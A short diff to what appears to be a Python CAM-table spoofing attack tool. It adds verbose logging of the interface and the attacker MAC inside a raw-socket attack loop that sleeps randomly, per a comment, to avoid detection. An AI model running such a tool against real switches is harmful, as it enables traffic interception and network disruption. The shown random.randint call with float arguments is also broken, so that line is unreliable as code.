@@ -112,6 +112,9 @@ def cam_spoofing():
     s.bind((args.interface, 0))
     with open(f"/sys/class/net/{args.interface}/address", "r") as f: 
         mac_src = f.read().strip() # Get the attacker MAC address from the network interface
+    if args.verbose or args.very_verbose:
+        print(f"[INFO] Using interface: {args.interface}")
+        print(f"[INFO] Attacker MAC address: {mac_src}")
     try:
         while True:
             time.sleep(random.randint(0.0000, 0.0005)) # Random sleep to avooid detection
